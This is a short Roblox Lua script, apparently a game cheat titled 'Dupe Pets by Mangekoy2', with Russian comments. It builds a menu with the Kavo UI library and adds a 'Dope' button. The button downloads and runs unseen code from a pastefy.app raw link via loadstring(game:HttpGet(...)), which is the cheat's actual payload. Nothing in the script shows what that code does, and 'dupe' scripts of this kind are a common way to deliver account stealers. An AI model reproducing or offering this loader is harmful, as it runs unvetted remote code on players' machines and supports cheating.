local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pets by Mangekoy2 | v2.0", "Serpent")

-- Вкладка Main
local MainTab = Window:NewTab("Main")
local MainSection = MainTab:NewSection("Dope Pets")

-- Кнопка с текстовым полем
local button = MainSection:NewButton("Dope", "Write your pet here", function()
    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
end)

-- Настройка внешнего вида
button.Instance.Size = UDim2.new(0, 300, 0, 30)
button.Instance.TextXAlignment = Enum.TextXAlignment.Left

-- Вкладка Credits
local CreditsTab = Window:NewTab("Credits")
CreditsTab:NewSection("Any pet")
